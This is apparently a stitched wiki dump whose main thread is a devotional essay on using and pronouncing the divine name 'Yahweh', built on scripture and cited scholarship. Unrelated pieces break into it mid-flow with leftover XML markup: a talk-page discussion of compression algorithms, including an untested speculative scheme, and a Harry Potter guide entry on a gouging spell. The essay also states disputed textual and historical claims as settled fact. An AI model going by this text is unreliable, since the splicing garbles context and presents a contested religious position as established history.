The Name of the Heavenly Father was and is the most important Name, for it not only identifies who our Creator is but what He is to those who invoke His Name.    Yahweh's Name has a deeper meaning than many realize.  His Name means that He is the only One having real existence;  that He is the One Who is;  that He is One Who causes all things to be, and to be able to be,  and all is dependent upon Him.

Using the Name of Yahweh and revering it is a key to understanding the nature and character of our Heavenly Father.   By using His Name, the only real and personal covenant Name, we acknowledge that we know Yahweh as the Self-Existing One,  and live in trust and dependence of His provision for us.

His Name portrays His character and the two, His Name and character, are inseparable. His Name represents His character, but does not stand for His character. Part of His character is that as a Person, He has a Name, and that Name is Yahweh and He identifies Himself as such by that Name.
He says, “I am Yahweh, that is My Name:”   Isaiah 42: 8

A name is different to a title. Every person has a personal name, some have titles as well according to their marital status or profession in life or otherwise. But, while a title may be sufficient to address a person in their position, it is not appropriate in personal relationships to use a title in place of a name.

Likewise we do not address people respectfully by using terms denoting their characteristics instead of their personal name. How much more so with the Almighty when we are told to honor His Name and not take His Name in vain.    (Exodus 20: 7)

There are many instructions we are given to do with His Name which, to follow, must involve the literal use of His Name as it would otherwise not be possible to fulfill them. 

Interpreting His Name as representing His character only, means applying a different interpretation to the commands. For example, to honor and bless His Name would have to mean honoring and blessing His character. To assemble In His Name would be to assemble in His character. To preach, teach or anoint in His Name would then be to do them in His character. All of which we do by doing those things in His Name, but it is a distortion of meaning to interpret the Name as representing His character only.

Throughout scripture Yahweh signatures everything He says with His Personal Name, and it is actually used nearly 7,000 times. The written and spoken literal Name is actually His mark of identification and He has given His Name as a memorial of Himself - what He is and Who He is.

&quot;This is My Name forever, and this is My memorial to all generations” Exodus 3:15

His people are instructed to call upon His Name - See Psalm 105: 1

==THE IMPORTANCE OF USING THE NAME==
In scripture there is great emphasis put upon using His name in praise, worship, prayer and thanks-giving. There is a differentiation made from addressing Him as 'God' (elohim) in a generic sense, or in using titles to refer to Him, from actually using His Name. His Name should be exalted by being used in worship, prayer and praise and in speaking of His wondrous works. 

“Bless Yahweh O my soul: and all that is within me bless His holy Name” Psalm 103: 1

“I will extol You, my elohim, O King; I will bless Your Name for ever and ever” Psalm 145: 1

Daniel answered and said, Blessed be the Name of Elohim for ever and ever:”  Daniel 2:20

&quot;All nations whom thou hast made shall come and worship before thee, O Yahweh; and shall glorify thy Name,&quot; Ps. 86: 9 &quot;From the rising of the sun unto the going down of the same Yahweh's name is to be praised,&quot; Ps. 113: 3. 

&quot;All the earth shall worship thee, and shall sing unto thee; they shall sing to thy Name, Selah,&quot; Psalm 66: 4

“Sing unto Him, sing psalms unto Him: talk of His wondrous works.” Psalm 105:2  
Glory in His holy Name: let the hearts of those who rejoice seek Yahweh.” 	(105:3)
&quot;Sing to God, sing praises to His Name&quot;   Psalm 68:4

“Give unto Yahweh the glory due to His Name; worship Yahweh in the beauty of Holiness”   Psalm 29: 2

“O magnify Yahweh with me, and let us exalt His Name together.”   Psalm 34: 3
“Let them praise the Name of Yahweh: for His Name alone is exalted;”   Psalm 148:13

“I will offer to You the sacrifice of thanksgiving, and I will call on the Name of Yahweh. Psalm 116:17

“Therefore by Him (Y'shua) let us continually offer the sacrifice of praise to Yahweh, that is, the fruit of our lips, giving thanks to His Name.” Hebrews 13:15

''It is Holy'':   &quot;For thus saith the high and lofty One that inhabits eternity, whose name is Holy; I dwell in the high and holy place, with him also that is of a contrite and humble spirit ... &quot;    Isaiah 57:15
''
''Excellent:    &quot;O Yahweh, our Master, how excellent is Your Name in all the earth, you who set your splendor above the heavens,&quot; Psalms 8:1. 

''Majestic'':   &quot;And He shall stand and feed His flock in the strength of Yahweh, in the majesty of the Name of Yahweh his Elohim; and they shall abide: for now shall He be great unto the ends of the earth,&quot; Micah 5: 4.

''Awesome'':   &quot;He sent redemption to His people; He has commanded His covenant forever:  Holy and awesome is His Name,&quot;  Psalm 111: 9.

==PRONOUNCING THE NAME==
The Tetragrammaton, YHWH,  according to the authority of Josephus, who being of the priestly line knew the facts kept from the people regarding the Sacred Name, was four vowels.   From the 9th century BC on, these former consonants began to double as vowels, whereas previously vowels had not been written.  In Greek transcription they were IEUE (4 vowels) or Iaoue, which is the way it appears in the Septuagint, the Greek version of the Old Testament.   Assyrian transcripts also give this as IAAU (YOD-HEY-WAW).

Y-H-W-H  --  These letters are not vowels in the current usage of our language, but 'Y' can have a soft rendering and is not a hard consonant.   'W' used to be a double 'u' which had a 'oo' pronunciation, and 'H' is also a soft consonant in our language.

The 'Y' carries a 'Ya' sound as in Hallelujah   ---   
The 'H' is an aspirate sounded 'H'
The 'W' is an 'oo' sound,  and,  
The last 'H' carries an aspirate 'hey' sound.

'Ya - H - oo - Hey'   -   or   'Yah-oo-eh.   


Most sources endorse this.   The Encyclopedia Biblica says,  &quot;The controversy as to the correct pronunciation of the Tetragrammaton, whether as Yahweh, or Yahawe, Yahwa or Yahawa .... has been gradually brought to an end by the general adoption of the view, first propounded by Ewald, that the true form is Yahwe&quot;  Divine Names p. 3311

The Encyclopedia Judaica confirms this,  &quot;Several Greek writers of the Christian Church testify that the name was pronounced 'Yahweh'&quot;   Vol.7 p.786    

Samaritan poetry uses the Tetragrammaton, rhyming it with words with the same sound as 'Yah-oo-ay' giving us the phonetic sound of the Name. (Journal of Biblical literature, 25, p.50 and Jewish Encyclopedia Vol.9 p.161)

	&quot;Yahweh bless thee, and keep thee: Yahweh make his face shine upon thee, and be gracious unto thee, Yahweh lift up his countenance upon thee, and give thee peace.  And they shall put My Name upon the children of Israel; and I will bless them,&quot; Numbers 6:24-27.

== Sorry for the spelling ==
It was late last night when I made the contributions. I'll make an effort to correct my utilization of the plural. Thanks for your input.

Are you up-to-date on new algorithms and their characteristics ?&lt;br&gt;I'm implementing a network application that will operate mostly over the Internet and I'm attempting to select what compression to implement on my protocol, it has to be quick on compression, handle the full range of the connection (some sort of shared dictionary could be possible since I'm implementing both ends), compression will be made in bursts of ~512 bytes, low system footprint and able to deal with already compressed data.&lt;br&gt;
My idea is to use some variation of the LZO ([[w:Lempel-Ziv-Oberhumer|Lempel-Ziv-Oberhumer]]) if I can get a C/C++ implementation that is BSD (or even LGPL) licensed, if not I'll be probably using the 7z LZMA SDK. I would appreciate any info you may provide on the subject.  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 22:07, 3 December 2009 (UTC)

:No problemo, these kind of things sometimes stick out, so I change them when I see them.

:The question I see, is what kind of storage load do you want on the client? Anything that can replace data with stored data on the client, will increase the throughput, but may also limit the speed since you can't control an internet clients load factor. In other words you have to balance the compression factor against the client load if speed is an issue, and you indicate that it might be.

:The next question that needs to be asked, is what type of data are you sending. (No need to tell me, but you want to model your data}, do a little profiling and so on, so that you know what your natural redundancy factor is etc. For instance if you are sending a lot of compressed data, as your raw data, you might already have lost considerable redundancy in the data during the compression step. This means that the compression mechanism you use for the general data stream, will probably not have as easy a time, compressing it again.

:The next problem is compression ratio against minimal data needed to recover the file. Most compression schemes require that a residual is kept, or a record is built that tells how to recreate the data. 7z for instance claims that it can compress 7 times the compression ratio of regular zip files, but you might want to decompress, first before compressing in 7z, if it doesn't deal well with the residual data. I have seen the 7z advertisements but it has not been clear to me whether the 7 times performance was based on a zip file input. You would have to get into the actual scientific literature on the scheme to find that out, and I haven't bothered.

:One of the problems with allowing the data stream to include zipped files, is that the only information you have on the original data, is it's zip scheme. It might be possible to tailor a specific compression mechanism to the actual nature of the data. Custom Data Compression schemes can often achieve a 9 fold increase over zip files, because they can work with a topic specific dictionary. Obviously you can't do that, if you are using a pre-zipped datafile, because the content is masked by the compression results. Unzipping and rezipping a file however will tend to make your program a limited time offer, since any change in compression efficiency in the long-term will result in obsolescence of your unzipping component.

:Another thing you might want to look into is the server-side compression scheme. If you have a powerful enough server, you might be able to do a more complex compression scheme, that would run slow on a PC but because of parallelism or something run faster on the server. This Assymmetric compression, means that you can tune the compression algorythm on the server, and the Client just needs to follow the decryption mechanism. Consider that some compression schemes work better than others for some types of data. PKzip used to sense the datatype and use a different method to compress and decompress, giving you a list of the methods as it decompressed. Extend this a little further, think speculative compression, you compress the same file in multiple compression formats, and decompress it, again, compare the output to the original file, if there is an error then ignore that technique. if not, then pick the technique that gave you the best compression, you might be surprised to find that it is not always the technique that has the best generalized compression ratio that wins.

:Of course my personal favorite is Entropy Injection. Essentially instead of a dictionary, you have a large table of selected seeds for random number generation. You compress the file, and then speculatively inject different random numbers (XOR?)from each separate seed, and compress again, The idea is that injecting entropy, might actually increase the order, thus giving you a better chance to compress the previous compression schemes result. It is based on one of Wolframs experiments with class 4 cellular automata and has as far as I know never been tested.

:since the random number bases would be common, coding could be limited to some sort of selection code for the base, and some indication of which random number or range of random numbers to use, and which version of compression successfully out performed the others. The trick with this type of coding is to make the record long enough that when it's residual is added to the coding string, it is still reduced enough in size to give a positive compression, even after entropy injection.--[[User:Graeme E.

      <text xml:space="preserve">==HIS REVELATION TO THE PATRIARCHS==
“I am Yahweh,  I appeared unto Abraham, unto Isaac, and unto Jacob, by the name of God Almighty [El Shaddai] but by my name Yahweh was I not known to them”   Exodus 6: 2-3

Some Bible expositors contend that this passage shows that Yahweh had not revealed His Name to the patriarchs. That even Moses did not know that His Name was Yahweh, but knew Him only as God or El Shaddai.  This is incorrect as Yahweh revealed Himself to Moses by His Name in Exodus 3. 

Moses anticipating Israel's response to his claims, says to Yahweh “ and they shall say to me ‘What is His Name?’ what shall I say unto them?” Exodus 3:13. From His response it is clear Yahweh invoked His personal Name and revealed it to Moses:  &quot;God said unto Moses, ‘I AM THAT I AM:’ and He said, Thus shall you say unto the children of Israel, ‘I AM has sent me unto you.  ’And God said moreover unto Moses, Thus shall you say unto the children of Israel, ‘Yahweh, the God of your fathers, the God of Abraham, the God of Isaac, and the God of Jacob, has sent me unto you:’  this is My name forever, and this is My memorial unto all generations”  Exodus 3:14    (Here He identified Himself as the One the fathers knew)

When Moses had gone aside to see the burning bush, he was told to remove his shoes as Yahweh’s presence consecrated the very ground upon which he stood. This meeting with Yahweh took place after Moses had spent 40 years on the back side of the desert and here He clearly reveals Himself to Moses.   Moses heard Yahweh’s Name firsthand as he stood barefoot at the burning bush when he was commissioned to become the deliverer of Israel. Moses heard His voice again and saw His glory when He spoke to him in Exodus 6:1-8 and revealed His plans to free them and redeem them unto Himself. 
Moses mother’s name was Jochebed   (Strongs 3115). It literally means, Glory of Yah, or Yahweh-gloried.

This is one of many evidences that the Name was known and incorporated in given names of the people even before Moses had this revelation of Yahweh's Name.	Numbers 26:59

===Yahweh's Name in Genesis===
Moses wrote the first five books of the Bible and in Genesis alone “Yahweh” appears 164 times!   

* The first place we find Yahweh’s Name is Genesis 2:4.
* The first woman, Eve, is quoted in Genesis 4:1, &quot;I have gotten a man from Yahweh!&quot;  Eve, the mother of all living (Genesis 3:20), acknowledged Yahweh by name as the Giver of her son.  
* The knowledge of the Name was known to mankind as early as the second generation after Adam. Speaking of that period of history, the book of Genesis relates, “At that time men began to call on the Name of Yahweh”   Genesis 4:26. 
* Yahweh often introduces Himself as the Mighty One of Abram, Isaac and Jacob who all knew and worshipped Him as Yahweh.
* When called out of Ur of the Chaldees, Abram built an altar unto Yahweh and also called upon the Name of Yahweh, Genesis 12:8.
* Isaac was visited by Yahweh at Beersheba, and the promises made to Abraham were renewed with Isaac. There Isaac built an altar and called upon the Name of Yahweh, Genesis 26:25.
* In a dream Jacob saw a staircase ascending to the heavens. &quot;Behold, Yahweh stood above it, and said, I am Yahweh God of Abraham thy father, and the God of Isaac: the land whereon you lie, I will give it to you and your descendants.”   Genesis 28:13.

Thus, we see that prior to the Flood and afterward His people all knew and called upon the Name of the Sovereign Yahweh and worshiped in His Name, as did the patriarchs Abraham, Isaac, and Jacob.

==HIS REVELATION TO ISRAEL==
Prior to the time of His revelation to Moses, Yahweh had acted as the omnipotent El Shaddai, the Creator and omniscient Sovereign of the earth.   Now He determines to reveal Himself in His redemptive power to Israel and bring them into covenant relationship with Himself. By acting on their behalf, to redeem and deliver them by mighty works of His intervention,  they would comprehend the meaning of His Name,  through the insight provided by deep personal experience. 
   
“Wherefore say unto the children of Israel, I am Yahweh, and I will bring you out from under the burdens of the Egyptians, and I will rid you out of their bondage, and I will redeem you with a stretched out arm, and with great judgments: And I will take you to Me for a people, and I will be to you an God: and you shall know that I am Yahweh your God, which brings you out from under the burdens of the Egyptians. ”   Exodus 6: 6-8.

His acts demonstrated the meaning of His name as the One who would be all that they needed Him to be.

Israel anciently was known as 'the people of Yahweh', after they came into covenant relationship with Him.  They were to represent Him and His way of life here on earth, and be a model nation for the heathen around them. 

Yahweh calls Israel “His people”, and says they are called by His Name. This privilege of calling upon His Name as &quot;Yahweh&quot; was only to Israel, His people.
Yahweh is the exclusive Covenant Name made known to His people with whom He is in relationship. Those who love Him and keep His commandments,  are in a son/daughter family relationship with Him.   Exodus 20: 5

He desires to allow only those dedicated to Him to know and invoke His Name, &quot;Yahweh&quot;, as an identifying mark of those who truly love and serve Him.   Thus, the literal expression, &quot;call one's name over or upon&quot; a people or place indicated a claim of possession or ownership.  Declaring one's name was a chief means of revealing or manifesting oneself:  &quot;And in very deed for this cause have I raised you up, to shew in you My power; and that My Name may be declared throughout all the earth,&quot; Exodus 9:16.

&quot;To a Semite a name establishes a mystic union between the knower and the known. To know the name of another is in some sense to have him in one’s soul. To pronounce his name is to make Him present here... To disclose one’s personal name is to surrender the inmost citadel of one’s self and hand over its keys. It is to lay oneself open to the reality, power, influence, needs, and love of the other.   This view of names is fraught with consequences when Yahweh reveals His name to people and people name Him and name themselves to Him,”   (Naming God, Scharlemann, pp. 6-10.)

Israel was fully identified as being His people,  and He their God.   Israel had been redeemed from the death and bondage of Egypt, and had ratified the Covenant proposed by Yahweh (Ex. 24:1-8).    

Moses asked to see His glory, (Exodus 33:18)  and Yahweh proclaimed His Name at the same time He revealed His glory:   “And Yahweh descended in the cloud, and stood with him there, and proclaimed the Name of Yahweh. And Yahweh passed by before him, and proclaimed, Yahweh, Yahweh God,  merciful and gracious, longsuffering, and abundant in goodness and truth, Keeping mercy for thousands, forgiving iniquity and transgression and sin, and that will by no means clear the guilty; visiting the iniquity of the fathers upon the children, and upon the children’s children, unto the third and to the fourth generation. And Moses made haste, and bowed his head toward the earth, and worshipped,”  Exodus 34: 5-8.

Yahweh’s Name is intimately bound up in His glory and righteous character.   Yahweh’s Name and glory reveal that He is merciful and gracious, patient, full of goodness and truth, exceedingly merciful. All of these attributes are bound up in His glorious Name.

===Usage of the Name===
As well as using the shortened form of the Name 'Yah' in given names, the Name was used in everyday speech and in greetings,  as is seen in the following --

* Boaz greeting his reapers, &quot;Yahweh be with you.   And they answered him, Yahweh bless you.&quot;  Ruth 2:4
* Samuel's instruction to the people, &quot; turn not aside from following Yahweh, but serve Yahweh with all your heart&quot;  1 Samuel 12:20
* In conversation Joshua uses Yahweh's personal name,  e.g. - Joshua Ch.1:10-11, 17; 3:3-6; 4:21-24
* Note Joshua's final address to the people and their answer using Yahweh's Name Ch.24:14-18
:(using KJ Version wherever 'LORD' appears in capitals it is Yahweh in the original)
* His name was known to Rahab and the nations of that era for what He did at the Red Sea, Joshua 2:9-10

Yahweh was known by name as the God of Israel and the Name was in use in Israel as recorded in the scriptures, as well as by external records, until their apostasy and their captivity into Babylon.
The Name of Yahweh is intended to be used by His people (Deuteronomy 28:10)

&quot;O magnify Yahweh with me, and let us exalt His Name together&quot; 	Psalm 34: 3

==RESTORATION OF HIS NAME==
Speaking of the end days, Yahweh says that He will purify and refine His people Israel in the land,  and one third of them shall be saved,  and,  “They shall call upon My Name, and I will answer them.  I will say, This is My people;  and each one will say, Yahweh is my God.”   Zechariah 13: 9
After He has judged them, they will be forgiven for polluting His name among the heathen where they have been,  through their idolatry (Ezekiel 23:49)

&quot;In those days and at that time, says Yahweh, the children of Israel shall come, they and the children of Judah together;  with continual weeping they shall come, and seek Yahweh their God.  (the 2 Houses)
They shall ask the way to Zion, with their faces toward it saying, 'Come let us join ourselves to Yahweh in a perpetual covenant that will not be forgotten.'&quot;    Jeremiah 50: 4-5

&quot;The Redeemer will come to Zion, and to those who turn from transgression in Jacob, says Yahweh.
As for Me, says Yahweh, this is My covenant with them: My Spirit who is upon you, and my words which I have put in your mouth, shall not depart from your mouth, nor from the mouth of your descendants, says Yahweh, from this time forth and forevermore.&quot;    Isaiah 59:20-21

&quot;Therefore My people shall know My Name;  therefore they shall know in THAT day that I am He who speaks”   Isaiah 52:6    
This is prophetic of the future restoration and deliverance of Israel when He will demonstrate His power on behalf of those who have returned to Him and call upon Him.  

&quot;And My holy Name I will make known in the midst of My people Israel; and I will not let My holy Name be profaned anymore; and the nations shall know that I am Yahweh, the Holy One of Israel&quot; Ezekiel 39: 7

When Yahweh has brought His people back to the land and back to Himself then the 'Gentiles' also shall come to Yahweh from the ends of the earth and say, 
&quot;Surely our fathers have inherited lies, worthlessness and unprofitable things. Will a man make gods for himself which are not gods?

&quot;Therefore I am causing them to know at this time, I cause them to know My hand and My might. And they shall know My Name is Yahweh.&quot; Jeremiah Chapter 16 verses 19-21 of the passage, verses 14-21

When Israel once again begins to call on the Name of Yahweh, those of the nations who at that time have not identified themselves as 'Israel'  will come to a realization of the deception, worthlessness and unprofitableness of their form of worship, which does not acknowledge the Name of Yahweh. The demonstrated true worship of Yahweh will expose that which is based on lies and has no real spiritual value and profit. The point in verse 21 is that they will know His Name is Yahweh.

&quot;For then I will restore to the peoples a pure language, that they all may call on the Name of Yahweh, to serve Him with one accord&quot; 	Zephaniah 3:9
This scripture is prophesying that all will know His Name.    It is of great importance to Yahweh that His Name is known, for our inheritance is in His Name.
By identifying with His Name we become identified as His covenant people - His spiritual family. The whole family of God is called by His Name (Eph. 3:15).  He is our spiritual Father and we His children. We, who have come from the nations, have been grafted into the olive tree, Israel.  Romans 11:17

So that now we are by adoption part of the nation of Israel,  no longer &quot;aliens from the commonwealth of Israel and strangers from the covenants of promise &quot;  (Ephesians 2:12)

&quot;I will call them My people who were not My people, and her beloved who was not beloved. And it shall come to pass in the place where it was said to them, 'You are not My people',  there they shall be called the sons of the living God &quot; (Romans 9:25-26 -  quote of Hosea 2:23 &amp; 1:10)

&quot;For there is no distinction between Jew and Greek, for the same Lord over all is rich to all who call upon Him.   'For whoever calls on the Name of Yahweh shall be saved'.&quot;	(Romans 10:12-13 quote of Joel 2:32)

He has only one covenant people, the commonwealth of Israel, whom He instructs to call on His Name.

      <text xml:space="preserve">==THE USE OF THE NAME IN APOSTOLIC WRITINGS==
Josephus records for us that it was  “not lawful” to use the Name  (Antiquities, bk.2, chap.12, part 4). Josephus meant that laws had been issued by rabbinical leaders forbidding the usage of the divine name.  The ban seems to have been nearly universal amongst the Jews by the first century.

The Gesenius Hebrew-English Lexicon  says of this name:  “pr. name of the supreme God amongst the Hebrews.  The later Hebrews, for some centuries before the time of Christ, either misled by a false interpretation of certain laws (Ex.20;7; Lev.24:11), or else following some old superstition, regarded this name as so very holy, that it might not even be pronounced. . . Whenever, therefore, this nomen tetragrammaton occurred in the sacred text . . . they were accustomed to substitute for it [Adonai], and thus the vowels of the noun [Adonai] are in the Masoretic text placed under the four letters [YHVH] . . . This custom was already in vogue in the days of the LXX translators . . .”

The Mishnah states:  “In the sanctuary one says the Name as it is written but in the provinces, with a euphemism” (m.Sotah 7:6; b.Sotah 38b; M. Tamid 7:2).
After the Temple’s destruction in 70 A.D., the Pharisees banned the usage of the Name completely.  The new teaching was that the name was to be “hidden” and “kept secret” (b.Pes. 50a; b.Kidd. 71a).

The original Jewish followers of Yeshua, were zealous of Torah and continued to live by the traditions (see Acts 21:20-24 ).  The divine name YHWH was and is the most sacred word in the Hebrew language, and  it is known that the Jews although they were antagonistic to the &quot;sect of the Nazarenes&quot; the followers of Yeshua, they would not destroy the New Testament writings because they contained the divine name.

This recorded information is evidence that the apostolic writings contained the divine Name.    How then did the 'erasing' of the Sacred Name in the Greek NT come about?
 
George Howard, Associate Professor of Religion and Hebrew at the University of Georgia, postulates that the later Gentile Christians, unlike the original Jewish believers, had no traditional reverence for the Hebrew Sacred Name and no doubt often even failed to recognise it, and that its eventual replacement with Greek surrogates paralleled its substitution in the non-Jewish copies of the Septuagint. Toward the end of the first Christian century, when the Church had become predominantly Gentile, as well as anti-Jewish, the motive for retaining the Hebrew Sacred Name was lost and the Greek substitutes 'kyrios' and 'theos' were used in the Christian copies of the Septuagint. And thus the compilers of the latter Greek NT texts, using these defective Septuagints, followed suit.

==TEXTUAL EVIDENCE==
We know from both the Tosefta and Talmuds (ancient Jewish writings) that certain (Hebrew and Aramaic?) New Testament manuscripts contained the name of YHWH in their text (t.Shab. 13:5; b.Shab. 116a; j.Shab. 15c).  Now our Hebrew and Aramaic manuscripts preserve for us knowledge of where &quot;Lord&quot; in the NT was YHWH and where it was ADON/ADONAI.

The DuTillet Hebrew manuscript of Matthew repeats the Hebrew letter YUD two or three times in a circle so as to mark places where the name of YHWH should go. The Shem Tob Hebrew version of Matthew has the Hebrew letter HEY standing alone (and in one place the word HASHEM spelled out) to mark places where the name of YHWH belongs. The Munster Hebrew text of Matthew actually contains the name of YHWH spelled out where it belongs. The Old Syriac, Peshitta and Crawford Aramaic manuscripts of NT books also distinguish between YHWH and ADON/ADONAI. These Aramaic manuscripts have Aramaic MARYA for YHWH and Aramaic MAR (or MARI or MARAN) for ADON/ADONAI. Now we have objective manuscript evidence to support placement of the sacred name into the NT.

Also a comparative study of various ancient Greek copies of the New Testament that have come down to us prove that where the sacred Name should have appeared, different texts have independently used different substitutes.    This variety of substitutes can directly be attributed to different scribes independently translating the original manuscripts and early copies during the time after the &quot;ineffable name&quot; doctrine had taken hold. In some cases 'theos' (God) is used, in others, kurios (Lord), Christos (Christ) or Yeshua (Jesus) in the same place in the text.

The &quot;ineffable name&quot; doctrine begins to appear in the works of Justin Martyr (a Samaritan convert -Mid 2nd century).   According to his own writings, he was influenced by the Jews.  This was before the apostolic writings were compiled into a canon of scripture.  
Origen of the 3rd century and Jerome of the 5th century, say that the sacred Name was set in Hebrew characters, &quot;in the accurate exemplars&quot; of the Greek text . (Pro Gal. Preaf. in Libr. Sam. et Mal.)
These copies had come from an earlier era when the Sacred Name was still used in the early assemblies.

Says Rabbi Yeshayahu Heiliczer, in “The Divine Name”:
“The evidence is enormous. The texts, the translations, the recent discoveries are almost overwhelming. But it is interesting to note that the other alternative, that is, continuing the ineffability and breaking the third commandment by bringing His name to naught is supported only by that -- superstition -- and some twisted idea that mispronouncing His name or refusing to use His name or purposely misspelling His name is somehow showing respect.
“The restoration of the use of the name of Yahveh with its correct pronunciation is as prophetically significant as the restoration of the true religion of Yahshua, that is, Torah observant Messianic Judaism. Such a restoration of the name of Yahveh to His people is promised in scripture:&quot;
He quotes  Zephaniah 3:9; Jeremiah 16:21 and Isaiah 52:6.

“We are living in wonderful times, as Yeshua tells us, ‘You shall not see me henceforth, till you shall say: “Blessed is he who comes in the name of Yahweh”’ (Mt. 23:39).”

==YESHUA'S USE OF THE DIVINE NAME ==
Speaking prophetically, the Psalmist says,
&quot;I will declare (apagello - tell, publish) Your name unto My brethren: in the midst of the assembly I will praise You,&quot; Psalms 22:22; and, quoted in Hebrews 2:12 regarding Yeshua revealing and manifesting the Father's Name to the ones He had been given, as He said, 
&quot;I have manifested (Efanerosa - revealed) Your name unto the men which You gave me out of the world:  they were Yours, You gave them to Me;  and they have kept Your word.  Now they have known that all things which You have given me are from You&quot;    John 17: 6-7.

&quot;And now I am no more in the world, but these are in the world, and I come to You.  Holy Father, keep through Your own name those whom You have given me, that they may be one, as We are. While I was with them in the world, I kept them in Your name: those whom You gave me I have kept, and none of them is lost, but the son of perdition; that the scripture might be fulfilled,&quot;    John 17:11-12.

&quot;O righteous Father, the world hath not known You: but I have known You, and these have known that You have sent Me. And I have declared (Gnorizo - made known) unto them Your name, and will declare it: that the love wherewith You have loved Me may be in them, and I in them,&quot;   John 17:25-26.

The writer of Hebrews places in the lips of Yeshua, Psalm 22:22  -  &quot;I will declare Your Name to My brethren&quot; (2:12).   In John Yeshua is quoted as saying, that He had uncovered/revealed the Name (v.6) and made it known (v.26).  This is more than demonstrating the Father's attributes in His exemplary life. Although it was the tradition established by the rabbis not to speak the Name,  Yeshua was faithful to the Father and made His Name known.

When He stood up to read in the synagogue cited in Luke 4:16-20, the passage of the Tanach that He chose contained the divine Name, not substituted as it is today, but written in ancient Hebrew in gold letters.Yeshua would have spoken the Name in reading the text.   As well as declaring the scripture fulfilled in Himself, would the utterance of the Name have stirred the crowd to anger?   (verses 28-30)There are many occasions in the New Testament where the Tanach is quoted containing passages with Yahweh's Name.   There is some justification for 'assuming' that in these instances the Name definitely was spoken when being read. As established previously, the original texts of the New Testament contained the written Name and some manuscripts still show evidence of the placement of the Name in the text.

At His betrayal in the garden, Yeshua declared the Name when the soldiers were seeking Him, and the power of the spoken Name threw them to the ground  (John 18: 5-8)   This was an instance of Him declaring Himself to be Yahweh manifest in the flesh.

In His trial, (Matthew 26:59-66),  Yehsua was accused of blasphemy for saying He was able to destroy the temple of 'God' and raise it in three days. In the Tanach, it was always referred to as the &quot;temple of Yahweh&quot;,  and they were quoting Him using a substitute for the Name.  Matthew 26:61

When adjured by Caiaphas to reveal who He was,  He applied Psalm 110.1 &amp; Dan.7:13 to Himself, to that Caiaphas said, &quot;What further need do we have of witnesses? .. .. You have heard His blasphemy&quot; (v. 64,5)

According to the Talmud, &quot;He who blasphemes is liable only when he will have fully pronounced the Divine Name.   Said R. Joshua ben Qorha, &quot;on every day of the trial they examine the witnesses with a substituted name.  When sentence was to be given they did not declare him guilty of death with the substituted name, but they put everyone out and ask the most important of the witnesses, saying to him, &quot;Say what exactly did you hear?&quot;  And he says what he heard.   And the judges stand on their feet and tear their clothing, and they may not mend them again.&quot;  (m.San. 7:5 from the Mishna)
:(The word 'God' in verse 61, and 'power' in v. 64 were  'euphemisms' or substitutes used by the Sanhedrin in such trials as these, in place of the Name).   He concluded His trial by using the Name in Psalm 110.

According to this pattern, verse 65 describes this very proceeding.    And Yeshua was as a result sentenced for blasphemy, which was not possible unless He had actually spoken the Divine Name.So according to His own testimony, He had revealed the Father's Name to His brethren, and did declare it until the end and His faithfulness to the declaration of the Name was His point of condemnation.

==YESHUA EXALTED THE FATHER'S NAME==
Yeshua taught the disciples the pattern prayer &quot;Hallowed be Your Name&quot;, exalting the Name of the Father.  Following it as a pattern would involve using the Name.  Matthew 6:9Reverencing and sanctifying His Name requires it to be given  a place of honour and importance.

Yeshua directed all worship to the Father   John 4:23;  Matthew 19:17
He proclaimed His dependence upon the Father as the greater - John 14:28;  for the things He spoke, 8:28;  and to do the works which He did,  -  5:36; 14:10-11; 5:19-20He said,  &quot;I have come in my Father's name&quot;   John 5:43 -  and at His triumphal entry into Jerusalem as their King,  the people cried out prophetically,
&quot;Hosanna! Blessed is he who comes in the Name of  Yahweh! the King of Israel!&quot; John 12:13; Psalm 118:26

Yeshua said the works that He did were done in  &quot; My Father's Name&quot;   John 10:25

They were not done in His own authority. Yeshua was Yahweh's representative acting and speaking with Yahweh's inspiration, power, and authority. Not only was He the messenger, He was the message.
 
All that He did was to glorify the Father's Name, and in His prayer before His final hour, He prayed &quot;Glorify Your Name&quot;,  to which the Father replied with an audible voice from heaven, 
&quot;I have both glorified it and will glorify it again&quot;   John 12:28
Yeshua was the pattern Son Who lived as an example for us to follow, glorifying the Father in all He did.

In His final hours of preparing His disciples, He instructed them of the authority they would have to use His Name, which He told them the Father would honour.  John 14:13-14    This was a transfer of authority from the works being done in the Father's Name to being done in Yeshua's Name.
He was given a Name which is above every name in heaven, on earth and in the regions below after His ascension to the throne.   Ephesians 1:21; Philippians 2:9-11; Colossians 3:17;  Hebrews 1:4

Yet still, although we confess in this way His lordship, authority and power, it is still &quot;to the glory of God the Father&quot;  (Phil.2:11),  and  &quot;giving thanks to God the Father through Him&quot;  (Colossians 3:17)

== Overview ==

'''''Defodio''''', a gouging spell, is used to cut channels or grooves in solid material.

== Extended Description ==

{{Muggles' Guide to Harry Potter/Beginner Spoiler}}

[[Muggles' Guide to Harry Potter/Characters/Hermione Granger|Hermione]] uses this spell to carve space into the tops of tunnels as the Trio escape from [[Muggles' Guide to Harry Potter/Places/Gringotts|Gringotts]] on the back of a [[Muggles' Guide to Harry Potter/Magic/Dragon|dragon]]. [[Muggles' Guide to Harry Potter/Characters/Harry Potter|Harry]] and [[Muggles' Guide to Harry Potter/Characters/Ron Weasley|Ron]] follow her lead, cutting away parts of the passages that the dragon is trying to get through as it finds its way out of the cellars of Gringotts.

== Analysis ==

It is interesting that spells are so very specific; it is noted that there are several different cleaning spells, [[Muggles' Guide to Harry Potter/Magic/Evanesco|Evanesco]] for inside containers, [[Muggles' Guide to Harry Potter/Magic/Scourgify|Scourgify]] for surfaces, and [[Muggles' Guide to Harry Potter/Magic/Tergeo|Tergeo]] for dust. Here we see that there is a specific spell for gouging surfaces; while it is similar to the other destructive curses, like [[Muggles' Guide to Harry Potter/Magic/Reducto|the Reductor curse]] and [[Muggles' Guide to Harry Potter/Magic/Deprimo|Deprimo]], it is not the spell that Hermione uses in this instance.

A large part of ability in [[Muggles' Guide to Harry Potter/Magic/Charms|Charms]], then, must be the ability to remember the specific spell that would provide the wanted effect, out of a list of possibly hundreds or thousands, along with the ability to associate the correct gestures and mental state with it.

==PROPHECIES FULFILLED IN YESHUA==
&quot;And it shall come to pass, that whosoever shall call on the name of Yahweh shall be saved,&quot; Acts 2:21, quoted from Joel 2:32.   -  &quot;And it shall come to pass, that whosoever shall call on the name of Yahweh shall be delivered: for in mount Zion and in Jerusalem shall be deliverance, as Yahweh hath said, and in the remnant whom Yahweh shall call,&quot;   Joel 2:32. 

